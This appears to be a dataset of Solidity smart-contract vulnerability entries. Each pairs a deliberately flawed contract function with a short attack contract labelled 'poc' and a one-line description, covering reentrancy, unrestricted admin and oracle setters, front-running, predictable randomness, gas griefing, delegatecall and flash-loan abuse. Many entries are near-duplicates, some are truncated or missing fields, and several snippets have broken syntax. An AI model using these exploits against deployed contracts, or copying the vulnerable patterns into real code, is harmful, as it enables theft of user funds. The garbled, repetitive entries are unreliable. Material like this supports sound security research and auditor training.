description: Flawed profit distribution evenly splits balance, causing overpayment to small user sets.

description: Unbounded queue processing causes gas exhaustion, halting contract operations.

code_snippet: function setVoteLock(address user, uint duration) public { voteLock[user] = duration; }
poc: contract Attack { function exploit(address target, address user, uint longDuration) public { Governance(target).setVoteLock(user, longDuration); } }
description: Unrestricted vote lock setting allows attacker to manipulate voting periods, affecting governance.

code_snippet: function placeTrade(uint amount, bytes32 hash) public { trades[msg.sender] = Trade(amount, hash); }
poc: contract Attack { function exploit(address target, uint amount, bytes32 hash) public { FrontRun(target).placeTrade(amount + 1, hash); } }
description: Public trade placement without commit-reveal allows front-running to manipulate trades.

code_snippet: function getRandom(uint seed) public returns (uint) { uint random = uint(keccak256(abi.encode(block.timestamp, seed))); return random % totalEntries; }
poc: contract Attack { function exploit(address target, uint predictableSeed) public { Random(target).getRandom(predictableSeed); } }
description: Predictable seed using timestamp and user input allows manipulation of random outcomes.

code_snippet: function triggerCallbacks(address[] memory callbacks) public { for(uint i = 0; i < callbacks.length; i++) { callbacks[i].call(abi.encodeWithSignature('run()')); } }
poc: contract Attack { function exploit(address target) public { address[] memory malicious = new address[](1000); GasGrief(target).triggerCallbacks(malicious); } }
description: Unbounded callback triggering causes gas exhaustion, disrupting contract functionality.

code_snippet: function forceLiquidate(address user, uint amount) public { if(debt[user] > 0) { seizeCollateral(user, amount); } }
poc: contract Attack { function exploit(address target, address victim, uint amount) public { LogicFlaw(target).forceLiquidate(victim, amount); } }
description: Flawed liquidation logic allows arbitrary seizures with minimal debt, bypassing ratio checks.

code_snippet: function withdrawWithHook(address target, bytes memory data) public { uint amount = balances[msg.sender]; (bool success,) = target.call{value: amount}(data); require(success); balances[msg.sender] = 0; }
poc: contract Attack { address target; function attack(address _target) public { target = _target; bytes memory malicious = abi.encodeWithSignature('hook()'); Reentrancy(target).withdrawWithHook(address(this), malicious); } function hook() external { if(gasleft() > 25000) Reentrancy(target).withdrawWithHook(address(this), malicious); } }
description: Reentrancy via custom hook call allows recursive fund drainage before state update.

poc: contract Attack { function exploit(address target, address fakeOracle, uint fakePrice) public { DeFiProtocol(target).updatePriceFeed(fakeOracle, fakePrice); } }
description: Unrestricted price feed update allows attacker to manipulate oracle data, affecting protocol logic.

code_snippet: function flashLoanMulti(uint amount, address[] memory pools, bytes memory data) public { for(uint i = 0; i < pools.length; i++) { token.transfer(msg.sender, amount); pools[i].call(data); } require(token.balanceOf(address(this)) >= amount); }
poc: contract Attack { function exploit(address target, address[] memory pools, uint amount) public { bytes memory malicious = abi.encodeWithSignature('manipulatePools()'); FlashLoan(target).flashLoanMulti(amount, pools, malicious); } }
description: Multi-pool flash loan with unverified call data enables complex pool manipulations, triggering mispriced trades.

code_snippet: function allocateRewards(address[] memory recipients) public { uint reward = totalBalance / recipients.length; for(uint i = 0; i < recipients.length; i++) { balances[recipients[i]] += reward; } }

description: Unrestricted vote escrow setting allows attacker to inflate voting power, manipulating governance.

code_snippet: function placeTrade(uint amount, bytes32 hash) public { trades[msg.sender] = Trade(amount, hash); }
poc: contract Attack { function exploit(address target, uint amount, bytes32 hash) public { FrontRun(target).placeTrade(amount + 1, hash); } }
description: Public trade placement without commit-reveal allows front-running to manipulate trades.

code_snippet: function getRandom(uint seed) public returns (uint) { uint random = uint(keccak256(abi.encode(block.timestamp, seed))); return random % totalEntries; }
poc: contract Attack { function exploit(address target, uint predictableSeed) public { Random(target).getRandom(predictableSeed); } }
description: Predictable seed using timestamp and user input allows manipulation of random outcomes.

code_snippet: function executeCallbacks(address[] memory callbacks) public { for(uint i = 0; i < callbacks.length; i++) { callbacks[i].call(abi.encodeWithSignature('run()')); } }
poc: contract Attack { function exploit(address target) public { address[] memory malicious = new address[](1000); GasGrief(target).executeCallbacks(malicious); } }
description: Unbounded callback execution causes gas exhaustion, disrupting contract functionality.

code_snippet: function forceLiquidate(address user, uint amount) public { if(debt[user] > 0) { seizeCollateral(user, amount); } }
poc: contract Attack { function exploit(address target, address victim, uint amount) public { LogicFlaw(target).forceLiquidate(victim, amount); } }
description: Flawed liquidation logic allows arbitrary seizures with minimal debt, bypassing ratio checks.

code_snippet: function withdrawWithHook(address target, bytes memory data) public { uint amount = balances[msg.sender]; (bool success,) = target.call{value: amount}(data); require(success); balances[msg.sender] = 0; }
poc: contract Attack { address target; function attack(address _target) public { target = _target; bytes memory malicious = abi.encodeWithSignature('hook()'); Reentrancy(target).withdrawWithHook(address(this), malicious); } function hook() external { if(gasleft() > 25000) Reentrancy(target).withdrawWithHook(address(this), malicious); } }
description: Reentrancy via custom hook call allows recursive fund drainage before state update.

code_snippet: function updatePriceFeed(address oracle, uint price) public { Oracle(oracle).updatePrice(price); }
poc: contract Attack { function exploit(address target, address fakeOracle, uint fakePrice) public { DeFiProtocol(target).updatePriceFeed(fakeOracle, fakePrice); } }
description: Unrestricted price feed update allows attacker to manipulate oracle data, affecting protocol logic.

code_snippet: function setProtocolConfig(uint value) public { protocolConfig = value; }
poc: contract Attack { function exploit(address target, uint maliciousValue) public { AccessControl(target).setProtocolConfig(maliciousValue); } }
description: Unrestricted protocol config setting allows any user to alter critical parameters, disrupting functionality.

code_snippet: function flashLoanMulti(uint amount, address[] memory pools, bytes memory data) public { for(uint i = 0; i < pools.length; i++) { token.transfer(msg.sender, amount); pools[i].call(data); } require(token.balanceOf(address(this)) >= amount); }
poc: contract Attack { function exploit(address target, address[] memory pools, uint amount) public { bytes memory malicious = abi.encodeWithSignature('manipulatePools()'); FlashLoan(target).flashLoanMulti(amount, pools, malicious); } }
description: Multi-pool flash loan with unverified call data enables complex pool manipulations, triggering mispriced trades.

code_snippet: function allocateRewards(address[] memory recipients) public { uint reward = totalBalance / recipients.length; for(uint i = 0; i < recipients.length; i++) { balances[recipients[i]] += reward; } }
poc: contract Attack { function exploit(address target) public { address[] memory recipients = new address[](1); LogicError(target).allocateRewards(recipients); } }
description: Flawed reward allocation divides balance evenly, causing overpayment with single recipient.

code_snippet: function proxyExecute(address target, bytes memory data) public { target.delegatecall(data); }
poc: contract Attack { function exploit(address target) public { bytes memory malicious = abi.encodeWithSignature('corruptStorage()'); UncheckedCall(target).proxyExecute(address(this), malicious); } function corruptStorage() public { /* corrupt storage */ } }
description: Unverified delegatecall enables storage corruption via malicious contract, compromising integrity.

code_snippet: function setThreshold(uint threshold) public { rewardThreshold = threshold; }
poc: contract Attack { function exploit(address target, uint extremeThreshold) public { DeFiProtocol(target).setThreshold(extremeThreshold); } }
description: Unvalidated reward threshold setting allows extreme values, disrupting protocol logic.

code_snippet: function massAllocate(address[] memory recipients, uint amount) public { for(uint i = 0; i < recipients.length; i++) { balances[recipients[i]] += amount; } }
poc: contract Attack { function exploit(address target) public { address[] memory recipients = new address[](1); recipients[0] = address(this); Overflow(target).massAllocate(recipients, 2**256 - 1); } }
description: Unbounded mass allocation causes integer overflow, leading to incorrect balance updates.

description: Flawed liquidation logic allows arbitrary collateral seizures with minimal debt, bypassing checks.

code_snippet: function withdrawWithCallback(address target, bytes memory data) public { uint amount = balances[msg.sender]; (bool success,) = target.call{value: amount}(data); require(success); balances[msg.sender] = 0; }

description: Public trade placement without commit-reveal allows front-running to manipulate trades.

code_snippet: function getRandom(uint seed) public returns (uint) { uint random = uint(keccak256(abi.encode(block.timestamp, seed))); return random % totalEntries; }
poc: contract Attack { function exploit(address target, uint predictableSeed) public { Random(target).getRandom(predictableSeed); } }
description: Predictable seed using timestamp and user input allows manipulation of random outcomes.

code_snippet: function triggerCallbacks(address[] memory callbacks) public { for(uint i = 0; i < callbacks.length; i++) { callbacks[i].call(abi.encodeWithSignature('run()')); } }
poc: contract Attack { function exploit(address target) public { address[] memory malicious = new address[](1000); GasGrief(target).triggerCallbacks(malicious); } }
description: Unbounded callback triggering causes gas exhaustion, disrupting contract functionality.

code_snippet: function forceLiquidate(address user, uint amount) public { if(debt[user] > 0) { seizeCollateral(user, amount); } }
poc: contract Attack { function exploit(address target, address victim, uint amount) public { LogicFlaw(target).forceLiquidate(victim, amount); } }
description: Flawed liquidation logic allows arbitrary collateral seizures with minimal debt, bypassing ratio checks.

code_snippet: function withdrawFunds(address target, bytes memory data) public { uint amount = balances[msg.sender]; (bool success,) = target.call{value: amount}(data); require(success); balances[msg.sender] = 0; }
poc: contract Attack { address target; function attack(address _target) public { target = _target; bytes memory malicious = abi.encodeWithSignature('reenter()'); Reentrancy(target).withdrawFunds(address(this), malicious); } function reenter() external { if(gasleft() > 25000) Reentrancy(target).withdrawFunds(address(this), malicious); } }
description: Reentrancy via external call allows recursive fund drainage before balance update.

code_snippet: function setPrice(address oracle, uint price) public { Oracle(oracle).setPrice(price); }
poc: contract Attack { function exploit(address target, address fakeOracle, uint fakePrice) public { DeFiProtocol(target).setPrice(fakeOracle, fakePrice); } }
description: Unrestricted oracle price setting enables attacker to manipulate price feeds, causing mispriced trades.

code_snippet: function updateConfig(uint value) public { config.value = value; }
poc: contract Attack { function exploit(address target, uint maliciousValue) public { AccessControl(target).updateConfig(maliciousValue); } }
description: Unrestricted config update allows any user to alter critical parameters, disrupting protocol.

code_snippet: function flashBorrow(uint amount, address pool, bytes memory data) public { token.transfer(msg.sender, amount); pool.call(data); require(token.balanceOf(address(this)) >= amount); }
poc: contract Attack { function exploit(address target, address pool, uint amount) public { bytes memory malicious = abi.encodeWithSignature('manipulatePool()'); FlashLoan(target).flashBorrow(amount, pool, malicious); } }
description: Flash loan with unverified call data enables pool manipulation, triggering mispriced trades.

code_snippet: function splitFunds(address[] memory recipients) public { uint share = totalBalance / recipients.length; for(uint i = 0; i < recipients.length; i++) { balances[recipients[i]] += share; } }
poc: contract Attack { function exploit(address target) public { address[] memory recipients = new address[](1); LogicError(target).splitFunds(recipients); } }
description: Flawed fund splitting logic overpays single recipient, draining contract funds.

code_snippet: function executeProxy(address target, bytes memory data) public { target.delegatecall(data); }

description: Unverified delegatecall allows storage corruption via malicious contract.

code_snippet: function submitTrade(uint amount, bytes32 hash) public { trades[msg.sender] = Trade(amount, hash); }
poc: contract Attack { function exploit(address target, uint amount, bytes32 hash) public { FrontRun(target).submitTrade(amount + 1, hash); } }
description: Public trade submission allows front-running to manipulate trades.

code_snippet: function getRandom(uint seed) public returns (uint) { uint random = uint(keccak256(abi.encode(block.timestamp, seed))); return random % totalEntries; }
poc: contract Attack { function exploit(address target, uint predictableSeed) public { Random(target).getRandom(predictableSeed); } }
description: Predictable seed allows manipulation of random outcomes.

code_snippet: function triggerCallbacks(address[] memory callbacks) public { for(uint i = 0; i < callbacks.length; i++) { callbacks[i].call(abi.encodeWithSignature('run()')); } }
poc: contract Attack { function exploit(address target) public { address[] memory malicious = new address[](1000); GasGrief(target).triggerCallbacks(malicious); } }
description: Unbounded callback execution causes gas exhaustion, disrupting functionality.

code_snippet: function forceLiquidate(address user, uint amount) public { if(debt[user] > 0) { seizeCollateral(user, amount); } }
poc: contract Attack { function exploit(address target, address victim, uint amount) public { LogicFlaw(target).forceLiquidate(victim, amount); } }
description: Flawed liquidation logic allows arbitrary collateral seizures with minimal debt.

code_snippet: function withdrawWithHook(address target, bytes memory data) public { uint amount = balances[msg.sender]; (bool success,) = target.call{value: amount}(data); require(success); balances[msg.sender] = 0; }
poc: contract Attack { address target; function attack(address _target) public { target = _target; bytes memory malicious = abi.encodeWithSignature('hook()'); Reentrancy(target).withdrawWithHook(address(this), malicious); } function hook() external { if(gasleft() > 25000) Reentrancy(target).withdrawWithHook(address(this), malicious); } }
description: Reentrancy via hook call enables recursive fund drainage before state update.

code_snippet: function updatePriceFeed(address oracle, uint price) public { Oracle(oracle).updatePrice(price); }
poc: contract Attack { function exploit(address target, address fakeOracle, uint fakePrice) public { DeFiProtocol(target).updatePriceFeed(fakeOracle, fakePrice); } }
description: Unrestricted price feed update enables manipulation of oracle data.

code_snippet: function setProtocolConfig(uint value) public { protocolConfig = value; }
poc: contract Attack { function exploit(address target, uint maliciousValue) public { AccessControl(target).setProtocolConfig(maliciousValue); } }
description: Unrestricted protocol config setting allows any user to alter critical parameters.

code_snippet: function flashLoanMulti(uint amount, address[] memory pools, bytes memory data) public { for(uint i = 0; i < pools.length; i++) { pools[i].call(data); } require(token.balanceOf(address(this)) >= amount); }
poc: contract Attack { function exploit(address target, address[] memory pools, uint amount) public { bytes memory malicious = abi.encodeWithSignature('manipulatePools()'); FlashLoan(target).flashLoanMulti(amount, pools, malicious); } }
description: Multi-pool flash loan with unverified call enables complex manipulations.

code_snippet: function splitRewards(address[] memory recipients) public { uint share = totalBalance / recipients.length; for(uint i = 0; i < recipients.length; i++) { balances[recipients[i]] += share; } }
poc: contract Attack { function exploit(address target) public { address[] memory recipients = new address[](1); LogicError(target).splitRewards(recipients); } }
description: Flawed reward splitting overpays single recipient, draining funds.

code_snippet: function proxyExecute(address target, bytes memory data) public { target.delegatecall(data); }
poc: contract Attack { function exploit(address target) public { bytes memory malicious = abi.encodeWithSignature('corruptStorage()'); UncheckedCall(target).proxyExecute(address(this), malicious); } function corruptStorage() public { /* corrupt storage */ } }
description: Unverified delegatecall enables storage corruption via malicious contract.

code_snippet: function setSupplyLimit(uint limit) public { supplyLimit = limit; } }
description: Unvalidated supply limit allows extreme values, disrupting token economics.

code_snippet: function updateAdmin(address newAdmin) public { admin = newAdmin; }
poc: contract Attack { function exploit(address target) public { AccessControl(target).updateAdmin(address(this)); } }
description: Lack of access control on the `updateAdmin` function allows unauthorized updates to the admin address, leading to privilege escalation.

code_snippet: function withdrawAll(address payable _to) public { uint amount = balances[msg.sender]; (bool success,) = _to.call{value: amount)(); require(success); balances[msg.sender] = 0; }
poc: contract Attack { address target; function attack(address _target) public { target = _target; Reentrancy(target).withdrawAll(address(this)); } receive() external { if (gasleft() > 2000) { Reentrancy(target).withdrawAll(address(this)); } }
description: Reentrancy vulnerability in withdrawAll allows recursive calls to drain funds before balance is updated.

code_snippet: function refund(address user, uint amount) public { if (balance[user] => amount) ( balances[user] -= amount; payable(user).transfer(amount); } }
poc: contract Attack { function exploit(address target, address user, uint amount) public { LogicError(target).refund(user, uint(-1)); } }
description: Incorrect comparison operator in refund function can lead to underflow and unauthorized withdrawals.

code_snippet: function setPriceFromOracle(address oracle, uint price) public { Oracle(oracle).setPrice(price); }

description: Unrestricted price setting from Oracle enables manipulation of price feeds.

code_snippet: function flashBorrowAndExecute(uint amount, address pool, bytes memory data) public { token.transfer(msg.sender, amount); pool.call(data); require(token.balanceOf(address(this)) >= amount); }
